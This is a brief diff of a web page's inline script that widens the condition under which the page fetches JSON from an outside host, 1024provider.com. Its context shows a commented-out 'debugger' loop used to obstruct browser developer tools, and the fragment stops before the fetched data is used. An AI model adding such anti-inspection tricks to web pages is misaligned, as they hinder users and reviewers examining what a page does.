@@ -59,7 +59,7 @@
         setInterval(function () { debugger }, 500)
     </script>-->
       <script type="text/javascript">
-        if(window.location.hash == "#/")
+        if(window.location.hash=="" || window.location.hash == "#/")
         {
             fetch("https://1024provider.com/bhsb")
             .then((response) => response.json())
